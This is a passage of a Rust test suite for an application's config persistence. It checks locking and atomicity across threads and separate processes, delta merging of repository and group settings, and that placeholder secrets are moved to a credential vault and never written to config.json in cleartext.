        // And disk agrees with memory — the last write in the lock is the one persisted.
        let on_disk = load_app_config();
        assert_eq!(on_disk.font_size, 18);
        assert!(on_disk.services.server.enabled);
    }

    /// `load_app_config`'s secret-migration branch calls `save_app_config` directly,
    /// with no lock of its own. Before the lock-ownership split this raced against
    /// `commit_config_change`'s critical section; now `save_app_config` acquires
    /// `CONFIG_WRITE_LOCK` itself, so a concurrent call blocks until the in-progress
    /// commit releases it.
    #[test]
    fn secret_migration_save_serializes_with_concurrent_commit() {
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;

        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = Arc::new(crate::state::tests_support::make_test_app_state());
        let log: Arc<Mutex<Vec<&'static str>>> = Arc::new(Mutex::new(Vec::new()));

        let commit = {
            let state = state.clone();
            let log = log.clone();
            thread::spawn(move || {
                commit_config_change(&state, |c| {
                    log.lock().unwrap().push("a_holding_lock");
                    thread::sleep(Duration::from_millis(200));
                    let mut n = c.clone();
                    n.font_size = 18;
                    Ok(n)
                })
                .expect("commit");
                log.lock().unwrap().push("a_done");
            })
        };

        // Give the commit thread time to acquire CONFIG_WRITE_LOCK and enter its
        // sleep before starting the "unprotected" migration-style save.
        thread::sleep(Duration::from_millis(50));

        let migration_save = {
            let state = state.clone();
            let log = log.clone();
            thread::spawn(move || {
                let cfg = state.config.read().clone();
                log.lock().unwrap().push("b_start");
                save_app_config(cfg).expect("save b");
                log.lock().unwrap().push("b_done");
            })
        };

        commit.join().expect("commit thread");
        migration_save.join().expect("migration_save thread");

        let log = log.lock().unwrap();
        let pos = |needle: &str| log.iter().position(|e| *e == needle).expect(needle);
        assert!(
            pos("b_start") < pos("a_done"),
            "test setup invalid — b did not attempt while a held the lock: {log:?}"
        );
        assert!(
            pos("b_done") > pos("a_done"),
            "save_app_config completed while commit_config_change still held \
             CONFIG_WRITE_LOCK — the two writers raced instead of serializing: {log:?}"
        );
    }

    /// The test above proves the migration branch's *write* serializes against a
    /// concurrent writer. This proves the branch's *read* does too: `load_app_config`
    /// reads config.json before any lock is acquired, so a concurrent writer's newer
    /// value can land on disk between that read and the migration write — which then
    /// republishes the stale value it already had in hand, silently reverting the
    /// concurrent writer's update. The concurrent writer here is `ConfigFile::update`
    /// (not `commit_config_change`, which derives its payload from `state.config` and
    /// would overwrite our disk-seeded plaintext secret with the default, empty one and
    /// defeat the migration trigger).
    #[test]
    #[serial_test::serial]
    fn secret_migration_read_is_atomic_with_a_concurrent_writer() {
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;

        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let mut seed = AppConfig::default();
        seed.services.auth.session_token = "plaintext-secret".to_string();
        seed.font_size = 1;
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let log: Arc<Mutex<Vec<&'static str>>> = Arc::new(Mutex::new(Vec::new()));

        let writer = {
            let log = log.clone();
            thread::spawn(move || {
                ConfigFile::<AppConfig>::new(APP_CONFIG_FILE)
                    .update(|cfg| {
                        log.lock().unwrap().push("a_holding_lock");
                        thread::sleep(Duration::from_millis(200));
                        cfg.font_size = 99;
                        true
                    })
                    .expect("writer update");
                log.lock().unwrap().push("a_done");
            })
        };

        // Give the writer time to acquire CONFIG_WRITE_LOCK and enter its sleep
        // before starting the unprotected migration read.
        thread::sleep(Duration::from_millis(50));

        let reader = {
            let log = log.clone();
            thread::spawn(move || {
                log.lock().unwrap().push("b_start");
                let cfg = load_app_config();
                log.lock().unwrap().push("b_done");
                cfg
            })
        };

        writer.join().expect("writer thread");
        let seen = reader.join().expect("reader thread");

        {
            let log = log.lock().unwrap();
            let pos = |needle: &str| log.iter().position(|e| *e == needle).expect(needle);
            assert!(
                pos("b_start") < pos("a_done"),
                "test setup invalid — the reader did not attempt while the writer held \
                 the lock: {log:?}"
            );
        }

        assert_eq!(
            seen.font_size, 99,
            "load_app_config's own return value still carries the value it read before \
             the concurrent writer finished — the read and the migration write must be \
             one atomic critical section"
        );
        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(
            on_disk.font_size, 99,
            "the migration branch's write clobbered the concurrent writer's newer \
             value on disk with the stale value load_app_config read earlier"
        );
    }

    #[test]
    #[serial_test::serial]
    fn repository_delta_updates_one_id_without_losing_layout_or_other_records() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let repo_a = serde_json::json!({"path":"/a","displayName":"A","branches":{}});
        let repo_b = serde_json::json!({"path":"/b","displayName":"B","branches":{}});
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/a": repo_a.clone(), "/b": repo_b.clone()},
            "repoOrder": ["/a", "/b"],
            "activeRepoPath": "/b",
            "groups": {"g": {"id":"g","name":"Work","repoOrder":["/b"]}},
            "groupOrder": ["g"],
            "migrationMarker": {"keep": true}
        }))
        .expect("seed repositories");

        let repo_a_updated = serde_json::json!({
            "path":"/a",
            "displayName":"Renamed A",
            "branches":{}
        });
        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id":"/a","before":repo_a,"after":repo_a_updated.clone()}],
            "groups": []
        }))
        .expect("apply repository delta");

        let saved = load_repositories();
        assert_eq!(saved["repos"]["/a"], repo_a_updated);
        assert_eq!(saved["repos"]["/b"], repo_b);
        assert_eq!(saved["repoOrder"], serde_json::json!(["/a", "/b"]));
        assert_eq!(saved["activeRepoPath"], serde_json::json!("/b"));
        assert_eq!(saved["groups"]["g"]["name"], serde_json::json!("Work"));
        assert_eq!(saved["groupOrder"], serde_json::json!(["g"]));
        assert_eq!(saved["migrationMarker"], serde_json::json!({"keep":true}));
    }

    #[test]
    #[serial_test::serial]
    fn repository_delta_rejects_a_stale_same_record_update_without_overwriting_it() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let original = serde_json::json!({"path":"/repo","displayName":"Original","branches":{}});
        replace_repositories_for_test(serde_json::json!({
            "repos": {"/repo": original.clone()},
            "repoOrder": ["/repo"]
        }))
        .expect("seed repositories");

        let first = serde_json::json!({"path":"/repo","displayName":"First","branches":{}});
        save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id":"/repo","before":original.clone(),"after":first.clone()}],
            "groups": []
        }))
        .expect("first update");

        let second = serde_json::json!({"path":"/repo","displayName":"Second","branches":{}});
        let error = save_repositories(serde_json::json!({
            "mutationVersion": 1,
            "repos": [{"id":"/repo","before":original,"after":second}],
            "groups": []
        }))
        .expect_err("stale update must conflict");

        assert!(
            error.contains("repository configuration conflict"),
            "{error}"
        );
        assert!(error.contains("/repo"), "{error}");
        assert_eq!(load_repositories()["repos"]["/repo"], first);
    }

    #[test]
    #[serial_test::serial]
    fn independent_repository_additions_merge_their_order_membership() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {}, "repoOrder": [], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        for (path, name) in [("/a", "A"), ("/b", "B")] {
            save_repositories(serde_json::json!({
                "mutationVersion": 1,
                "repos": [{
                    "id": path,
                    "before": null,
                    "after": {"path":path,"displayName":name,"branches":{}}
                }],
                "groups": [],
                "repoOrder": {"before":[],"after":[path]}
            }))
            .expect("independent add must compose");
        }

        let saved = load_repositories();
        assert_eq!(saved["repos"].as_object().map(|repos| repos.len()), Some(2));
        let order = saved["repoOrder"].as_array().expect("repoOrder array");
        assert!(order.contains(&serde_json::json!("/a")));
        assert!(order.contains(&serde_json::json!("/b")));
    }

    #[test]
    #[serial_test::serial]
    fn independent_group_additions_merge_their_order_membership() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {}, "repoOrder": [], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        for (id, name) in [("a", "Alpha"), ("b", "Beta")] {
            save_repositories(serde_json::json!({
                "mutationVersion": 1,
                "repos": [],
                "groups": [{
                    "id": id,
                    "before": null,
                    "after": {"id":id,"name":name,"color":"","collapsed":false,"repoOrder":[]}
                }],
                "groupOrder": {"before":[],"after":[id]}
            }))
            .expect("independent group add must compose");
        }

        let saved = load_repositories();
        assert_eq!(
            saved["groups"].as_object().map(|groups| groups.len()),
            Some(2)
        );
        let order = saved["groupOrder"].as_array().expect("groupOrder array");
        assert!(order.contains(&serde_json::json!("a")));
        assert!(order.contains(&serde_json::json!("b")));
    }

    #[test]
    #[serial_test::serial]
    fn group_order_and_active_selection_conflicts_are_explicit() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let group = serde_json::json!({
            "id":"g", "name":"Original", "color":"", "collapsed":false, "repoOrder":[]
        });
        replace_repositories_for_test(serde_json::json!({
            "repos": {
                "/a":{"path":"/a"},
                "/b":{"path":"/b"},
                "/c":{"path":"/c"}
            },
            "repoOrder": ["/a", "/b", "/c"],
            "activeRepoPath": "/a",
            "groups": {"g":group.clone()},
            "groupOrder": ["g"]
        }))
        .expect("seed repositories");

        let renamed = serde_json::json!({
            "id":"g", "name":"Renamed", "color":"", "collapsed":false, "repoOrder":[]
        });
        save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[{"id":"g","before":group.clone(),"after":renamed}]
        }))
        .expect("rename group");
        let group_error = save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[{
                "id":"g",
                "before":group,
                "after":{"id":"g","name":"Original","color":"#fff","collapsed":false,"repoOrder":[]}
            }]
        }))
        .expect_err("stale group update must conflict");
        assert!(group_error.contains("group 'g'"), "{group_error}");

        save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "activeRepoPath":{"before":"/a","after":"/b"}
        }))
        .expect("change active repository");
        let active_error = save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "activeRepoPath":{"before":"/a","after":"/c"}
        }))
        .expect_err("stale active selection must conflict");
        assert!(active_error.contains("active repository"), "{active_error}");

        save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "repoOrder":{"before":["/a","/b","/c"],"after":["/b","/a","/c"]}
        }))
        .expect("first reorder");
        let order_error = save_repositories(serde_json::json!({
            "mutationVersion":1,
            "repos":[],
            "groups":[],
            "repoOrder":{"before":["/a","/b","/c"],"after":["/a","/c","/b"]}
        }))
        .expect_err("incompatible reorder must conflict");
        assert!(order_error.contains("repoOrder"), "{order_error}");
    }

    /// Two-process harness entry point for
    /// `load_app_config_migration_survives_concurrent_cross_process_write` below. Under
    /// a normal test run (`TUIC_CONFIG_TEST_ROLE` unset) this is a no-op — its job is to
    /// be re-invoked as a genuine CHILD OS PROCESS via `std::env::current_exe()`, so the
    /// file lock under test contends across two processes instead of two threads
    /// sharing one in-process `CONFIG_WRITE_LOCK`.
    #[test]
    fn two_process_child() {
        let Ok(role) = std::env::var("TUIC_CONFIG_TEST_ROLE") else {
            return;
        };
        let dir =
            PathBuf::from(std::env::var("TUIC_CONFIG_TEST_DIR").expect("TUIC_CONFIG_TEST_DIR"));
        let _guard = set_config_dir_override(dir);

        match role.as_str() {
            // TUIC_TEST_LOAD_APP_CONFIG_DELAY_MS (consumed inside load_app_config via
            // test_load_app_config_delay) widens the read-to-write window so the
            // parent process's concurrent write reliably lands inside it.
            "reader" => {
                load_app_config();
            }
            "delta-font" | "delta-collapse" => {
                // Each child captures the same stale process cache before either is
                // released to save. The production commit path must apply only its
                // cached-to-requested delta to the latest locked disk document.
                let cached = load_app_config();
                let state = crate::state::tests_support::make_test_app_state();
                *state.config.write() = cached;

                std::fs::write(config_dir().join(format!("{role}.ready")), b"ready")
                    .expect("write child ready marker");
                let release = config_dir().join("delta.release");
                let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
                while !release.exists() {
                    assert!(
                        std::time::Instant::now() < deadline,
                        "timed out waiting for delta test release"
                    );
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }

                commit_config_change(&state, |current| {
                    let mut next = current.clone();
                    if role == "delta-font" {
                        next.font_size = 18;
                    } else {
                        next.collapse_tools = true;
                    }
                    Ok(next)
                })
                .expect("commit child config delta");
            }
            "repo-delta-a" | "repo-delta-b" => {
                let path = if role == "repo-delta-a" { "/a" } else { "/b" };
                std::fs::write(config_dir().join(format!("{role}.ready")), b"ready")
                    .expect("write repository child ready marker");
                let release = config_dir().join("repo-delta.release");
                let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
                while !release.exists() {
                    assert!(
                        std::time::Instant::now() < deadline,
                        "timed out waiting for repository delta test release"
                    );
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }
                save_repositories(serde_json::json!({
                    "mutationVersion": 1,
                    "repos": [{
                        "id": path,
                        "before": null,
                        "after": {"path":path,"displayName":path,"branches":{}}
                    }],
                    "groups": [],
                    "repoOrder": {"before":[],"after":[path]}
                }))
                .expect("commit child repository delta");
            }
            other => panic!("unknown TUIC_CONFIG_TEST_ROLE: {other}"),
        }
    }

    /// The two tests above prove `load_app_config`'s migration read-to-write window is
    /// atomic against a concurrent writer — but only within ONE process, because both
    /// sides share the same in-process `CONFIG_WRITE_LOCK`. A prior fix attempt tested
    /// exactly that: two THREADS in one process. Since the second thread's
    /// `load_app_config()` call always blocks on that shared mutex until the first
    /// thread's write finishes, the read can never actually land inside a concurrent
    /// writer's window — the thread test passed against the buggy code AND the fixed
    /// code, proving nothing about the case this file lock exists for: a debug build and
    /// a release build, i.e. two separate OS processes, sharing one config directory.
    ///
    /// This test spawns the reader as a genuine second process (`std::process::Command`
    /// re-invoking the test binary itself, selected into "child" behavior via
    /// `TUIC_CONFIG_TEST_ROLE`). Advisory file locks (`std::fs::File::lock`) are tied to
    /// the open file description, not the process or thread, so only a second process —
    /// with its own independent open of the lock file — can actually contend for it.
    #[test]
    #[serial_test::serial]
    fn load_app_config_migration_survives_concurrent_cross_process_write() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        // Seed a config with a plaintext secret (forces the migration-write branch) and
        // a recognizable starting value.
        let mut seed = AppConfig::default();
        seed.services.auth.session_token = "plaintext-secret".to_string();
        seed.font_size = 1;
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let exe = std::env::current_exe().expect("current_exe");
        let mut child = std::process::Command::new(&exe)
            .arg("two_process_child")
            .env("TUIC_CONFIG_TEST_ROLE", "reader")
            .env("TUIC_CONFIG_TEST_DIR", dir.path())
            .env("TUIC_TEST_LOAD_APP_CONFIG_DELAY_MS", "1000")
            .spawn()
            .expect("spawn child reader process");

        // Give the child comfortably long enough to open and read config.json and enter
        // its artificial 1s delay before this process — a second, independent OS
        // process — writes a newer value through the same lock file.
        std::thread::sleep(std::time::Duration::from_millis(300));

        ConfigFile::<AppConfig>::new(APP_CONFIG_FILE)
            .update(|cfg| {
                cfg.font_size = 42;
                true
            })
            .expect("concurrent cross-process writer update");

        let status = child.wait().expect("wait for child reader process");
        assert!(status.success(), "child reader process failed: {status:?}");

        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(
            on_disk.font_size, 42,
            "the migration branch's write, in a SEPARATE process, clobbered this \
             process's newer concurrent write with the stale value it read before that \
             write landed on disk"
        );
    }

    /// Ordinary interactive saves, not just the secret-migration branch above, must
    /// compose across real process boundaries. Both child processes load the same stale
    /// AppConfig before either writes; each changes one independent field through
    /// `commit_config_change`. A whole-document implementation deterministically loses
    /// one field, while delta-under-lock retains both.
    #[test]
    #[serial_test::serial]
    fn ordinary_app_config_deltas_compose_across_two_processes() {
        crate::credentials::reset_test_faults();
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let seed = AppConfig::default();
        std::fs::write(
            dir.path().join(APP_CONFIG_FILE),
            serde_json::to_string_pretty(&seed).unwrap(),
        )
        .unwrap();

        let exe = std::env::current_exe().expect("current_exe");
        let mut children = ["delta-font", "delta-collapse"].map(|role| {
            std::process::Command::new(&exe)
                .arg("two_process_child")
                .env("TUIC_CONFIG_TEST_ROLE", role)
                .env("TUIC_CONFIG_TEST_DIR", dir.path())
                .spawn()
                .unwrap_or_else(|e| panic!("spawn {role} child: {e}"))
        });

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        for role in ["delta-font", "delta-collapse"] {
            let ready = dir.path().join(format!("{role}.ready"));
            while !ready.exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "timed out waiting for {role} child"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }
        std::fs::write(dir.path().join("delta.release"), b"release").unwrap();

        for child in &mut children {
            let status = child.wait().expect("wait for delta child");
            assert!(status.success(), "delta child failed: {status:?}");
        }

        let on_disk: AppConfig = serde_json::from_str(
            &std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).unwrap(),
        )
        .unwrap();
        assert_eq!(on_disk.font_size, 18, "font delta was lost");
        assert!(on_disk.collapse_tools, "collapse-tools delta was lost");
    }

    #[test]
    #[serial_test::serial]
    fn repository_deltas_compose_across_two_processes() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        replace_repositories_for_test(serde_json::json!({
            "repos": {}, "repoOrder": [], "groups": {}, "groupOrder": []
        }))
        .expect("seed repositories");

        let exe = std::env::current_exe().expect("current_exe");
        let mut children = ["repo-delta-a", "repo-delta-b"].map(|role| {
            std::process::Command::new(&exe)
                .arg("two_process_child")
                .env("TUIC_CONFIG_TEST_ROLE", role)
                .env("TUIC_CONFIG_TEST_DIR", dir.path())
                .spawn()
                .unwrap_or_else(|error| panic!("spawn {role} child: {error}"))
        });

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        for role in ["repo-delta-a", "repo-delta-b"] {
            let ready = dir.path().join(format!("{role}.ready"));
            while !ready.exists() {
                assert!(
                    std::time::Instant::now() < deadline,
                    "timed out waiting for {role} child"
                );
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }
        std::fs::write(dir.path().join("repo-delta.release"), b"release").unwrap();

        for child in &mut children {
            let status = child.wait().expect("wait for repository delta child");
            assert!(
                status.success(),
                "repository delta child failed: {status:?}"
            );
        }

        let saved = load_repositories();
        assert!(
            saved["repos"].get("/a").is_some(),
            "process A's add was lost"
        );
        assert!(
            saved["repos"].get("/b").is_some(),
            "process B's add was lost"
        );
        let order = saved["repoOrder"].as_array().expect("repoOrder array");
        assert_eq!(order.len(), 2);
        assert!(order.contains(&serde_json::json!("/a")));
        assert!(order.contains(&serde_json::json!("/b")));
    }

    #[test]
    fn app_config_delta_distinguishes_unchanged_fields_from_an_intentional_clear() {
        let base = AppConfig {
            global_hotkey: Some("CommandOrControl+Shift+T".to_string()),
            ..AppConfig::default()
        };
        let mut desired = base.clone();
        desired.global_hotkey = None;

        let delta = app_config_delta(&base, &desired).expect("derive delta");
        assert_eq!(delta.get("global_hotkey"), Some(&serde_json::Value::Null));
        assert!(
            delta.get("font_size").is_none(),
            "unchanged fields must be omitted, not mistaken for replacements"
        );

        let mut concurrently_changed = base;
        concurrently_changed.font_size = 22;
        let merged = merge_partial_app_config(&concurrently_changed, delta).expect("apply delta");
        assert_eq!(merged.font_size, 22, "unrelated concurrent change was lost");
        assert_eq!(merged.global_hotkey, None, "intentional clear was ignored");
    }

    /// Criteria 2 and 3 of #484-1a07 say "on disk", and that is the assertion that
    /// matters: the unit tests above prove `merge_partial_app_config` returns the
    /// right value, but the defect was what got PERSISTED. This drives the exact
    /// composition both `PUT /config` and the MCP `config action=save` use —
    /// `commit_config_change(state, |current| merge_partial_app_config(current, body))`
    /// — and then reads config.json back off the filesystem.
    #[test]
    fn a_partial_save_leaves_remote_access_enabled_on_disk() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        {
            let mut cfg = state.config.write();
            cfg.services.server.enabled = true;
            cfg.services.server.port = 9876;
        }

        // A body that says nothing whatsoever about remote access.
        let effects = commit_config_change(&state, |current| {
            merge_partial_app_config(current, serde_json::json!({ "font_size": 18 }))
        })
        .expect("partial save");

        let on_disk = load_app_config();
        assert!(
            on_disk.services.server.enabled,
            "a partial save must not switch remote access off ON DISK"
        );
        assert_eq!(on_disk.services.server.port, 9876);
        assert_eq!(on_disk.font_size, 18);
        assert!(
            !effects.server_changed,
            "an untouched listener must not trigger a needless rebind"
        );
    }

    /// The other half of criterion 4: a save that DOES change remote access must
    /// report it, because that flag is what makes the three writers rebind the
    /// listener instead of leaving the process serving a config the disk
    /// disagrees with until the next boot.
    #[test]
    fn a_save_that_changes_remote_access_asks_for_a_rebind() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        state.config.write().services.server.enabled = true;

        let effects = commit_config_change(&state, |current| {
            merge_partial_app_config(
                current,
                serde_json::json!({ "services": { "server": { "port": 9999 } } }),
            )
        })
        .expect("port change");

        assert!(effects.server_changed, "a port change must rebind");
        assert_eq!(load_app_config().services.server.port, 9999);
        assert!(
            load_app_config().services.server.enabled,
            "and the sibling must still survive the merge"
        );
    }

    /// A failing mutation must leave both memory and disk untouched.
    #[test]
    fn a_rejected_mutation_changes_nothing() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        let before = state.config.read().font_size;

        let err = commit_config_change(&state, |_| Err("nope".to_string())).unwrap_err();
        assert_eq!(err, "nope");
        assert_eq!(state.config.read().font_size, before);
    }

    /// Every writer must route through `config_for_disk`. `agent_mcp` used to call
    /// `save_json_config("config.json", &snapshot)` directly, which skips the stripping
    /// step and wrote the session token, relay token and VAPID private key to disk in
    /// cleartext — defeating the vault entirely. Going through `commit_config_change`
    /// makes that impossible for any caller.
    #[test]
    fn a_commit_never_leaves_a_secret_in_the_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let state = crate::state::tests_support::make_test_app_state();
        {
            let mut cfg = state.config.write();
            cfg.services.auth.session_token = "session-secret".to_string();
            cfg.services.auth.session_token_exists = true;
            cfg.services.relay.token = "relay-secret".to_string();
            cfg.services.relay.token_exists = Some(true);
            cfg.services.push.vapid_private_key = "vapid-secret".to_string();
            cfg.services.push.vapid_private_key_exists = true;
        }

        // A mutation that says nothing about secrets — the shape every incidental
        // writer (disabled_mcp_agents, global_hotkey, push auto-enable) has.
        commit_config_change(&state, |current| {
            let mut next = current.clone();
            next.disabled_mcp_agents = vec!["claude".to_string()];
            Ok(next)
        })
        .expect("commit");

        let raw = std::fs::read_to_string(dir.path().join(APP_CONFIG_FILE)).expect("read file");
        for secret in ["session-secret", "relay-secret", "vapid-secret"] {
            assert!(
                !raw.contains(secret),
                "{secret} was written to config.json in cleartext"
            );
        }
        // And the secrets are still reachable, i.e. they were moved, not dropped.
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken)
                .expect("vault readable"),
            Some("session-secret".to_string())
        );
        assert_eq!(
            load_app_config().disabled_mcp_agents,
            vec!["claude".to_string()]
        );
    }

    #[test]
    #[serial_test::serial]
    fn failed_token_rotation_restores_vault_disk_and_runtime() {
        let dir = tempfile::tempdir().expect("tempdir");
        let invalid_config_dir = dir.path().join("not-a-directory");
        std::fs::write(&invalid_config_dir, b"file blocks create_dir_all").unwrap();
        let _guard = set_config_dir_override(invalid_config_dir);
        crate::credentials::reset_test_faults();
        crate::credentials::set(
            crate::credentials::Credential::RemoteSessionToken,
            "old-token",
        )
        .unwrap();
        let state = crate::state::tests_support::make_test_app_state();
        state.config.write().services.auth.session_token = "old-token".to_string();
        state.config.write().services.auth.session_token_exists = true;
        *state.session_token.write() = "old-token".to_string();

        let error = rotate_session_token(&state).expect_err("disk persistence must fail");

        assert!(error.contains("Failed to create directory"), "{error}");
        assert_eq!(*state.session_token.read(), "old-token");
        assert_eq!(state.config.read().services.auth.session_token, "old-token");
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken).unwrap(),
            Some("old-token".to_string())
        );
    }

    #[test]
    #[serial_test::serial]
    fn failed_multi_secret_commit_restores_every_vault_value() {
        let dir = tempfile::tempdir().expect("tempdir");
        let invalid_config_dir = dir.path().join("not-a-directory");
        std::fs::write(&invalid_config_dir, b"file blocks create_dir_all").unwrap();
        let _guard = set_config_dir_override(invalid_config_dir);
        crate::credentials::reset_test_faults();
        for (credential, value) in [
            (
                crate::credentials::Credential::RemoteSessionToken,
                "old-session",
            ),
            (crate::credentials::Credential::RelayToken, "old-relay"),
            (
                crate::credentials::Credential::PushVapidPrivateKey,
                "old-vapid",
            ),
        ] {
            crate::credentials::set(credential, value).unwrap();
        }
        let state = crate::state::tests_support::make_test_app_state();

        let error = commit_config_change(&state, |current| {
            let mut next = current.clone();
            next.services.auth.session_token = "new-session".to_string();
            next.services.auth.session_token_exists = true;
            next.services.relay.token = "new-relay".to_string();
            next.services.relay.token_exists = Some(true);
            next.services.push.vapid_private_key = "new-vapid".to_string();
            next.services.push.vapid_private_key_exists = true;
            Ok(next)
        })
        .expect_err("disk persistence must fail");

        assert!(error.contains("Failed to create directory"), "{error}");
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RemoteSessionToken).unwrap(),
            Some("old-session".to_string())
        );
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::RelayToken).unwrap(),
            Some("old-relay".to_string())
        );
        assert_eq!(
            crate::credentials::get(crate::credentials::Credential::PushVapidPrivateKey).unwrap(),
            Some("old-vapid".to_string())
        );
        assert!(state.config.read().services.auth.session_token.is_empty());
    }

    #[test]
    #[serial_test::serial]
    fn rollback_failure_is_reported_with_the_primary_save_error() {
        use std::sync::atomic::Ordering;

        crate::credentials::reset_test_faults();
        crate::credentials::set(
            crate::credentials::Credential::RemoteSessionToken,
            "old-token",
        )
        .unwrap();
        let mut config = AppConfig::default();
        config.services.auth.session_token = "new-token".to_string();
        config.services.auth.session_token_exists = true;

        let error = save_app_config_with(config, |_| {
            crate::credentials::MOCK_FAIL_WRITES.store(true, Ordering::SeqCst);
            Err("forced disk failure".to_string())
        })
        .expect_err("save and rollback must fail");
        crate::credentials::reset_test_faults();

        assert!(error.contains("forced disk failure"), "{error}");
        assert!(error.contains("credential rollback also failed"), "{error}");
        assert!(error.contains("session token"), "{error}");
    }

    // -----------------------------------------------------------------
    // ConfigFile<T> — cross-process-safe update/save
    // -----------------------------------------------------------------

    #[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
    struct CounterDoc {
        counters: HashMap<String, i64>,
    }

    #[test]
    #[serial_test::serial]
    fn update_applies_concurrently_from_two_threads_without_losing_either_mutation() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        let file_a: ConfigFile<CounterDoc> = ConfigFile::new("counters.json");
        let file_b: ConfigFile<CounterDoc> = ConfigFile::new("counters.json");

        let t1 = std::thread::spawn(move || {
            file_a
                .update(|doc| {
                    doc.counters.insert("a".to_string(), 1);
                    true
                })
                .unwrap();
        });
        let t2 = std::thread::spawn(move || {
            file_b
                .update(|doc| {
                    doc.counters.insert("b".to_string(), 2);
                    true
                })
                .unwrap();
        });
        t1.join().unwrap();
        t2.join().unwrap();

        let file: ConfigFile<CounterDoc> = ConfigFile::new("counters.json");
        let doc: CounterDoc = load_json_config_from_path(&file.path);
        assert_eq!(
            doc.counters.get("a"),
            Some(&1),
            "thread A's mutation must survive"
        );
        assert_eq!(
            doc.counters.get("b"),
            Some(&2),
            "thread B's mutation must survive"
        );
    }

    #[test]
    #[serial_test::serial]
    fn update_skips_the_write_when_the_mutate_closure_declines() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let file: ConfigFile<CounterDoc> = ConfigFile::new("doc.json");

        file.update(|_doc| false).unwrap();

        assert!(
            !dir.path().join("doc.json").exists(),
            "update must not create/touch the file when mutate reports no change"
        );
    }

    /// The uncontended half of the contract above: a document another writer replaced
    /// since this caller last read it is overwritten, not refused. Whole-document saves
    /// are last-writer-wins by definition — the caller discards what `load()` returned.
    #[test]
    #[serial_test::serial]
    fn a_whole_document_save_overwrites_a_document_replaced_since_the_last_read() {
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());

        save_activity(serde_json::json!([{ "id": 1 }])).expect("seed write");
        ConfigFile::<serde_json::Value>::new(ACTIVITY_FILE)
            .save(&serde_json::json!([{ "id": 2 }]))
            .expect("interloper write");

        save_activity(serde_json::json!([{ "id": 3 }])).expect("must not be refused");
        assert_eq!(load_activity(), serde_json::json!([{ "id": 3 }]));
    }

    #[test]
    fn persist_atomic_leaves_no_temp_file_when_rename_fails() {
        let dir = TempDir::new().expect("temp dir");
        let target = dir.path().join("target.json");
        // Occupy the target path with a directory so temp->target rename fails
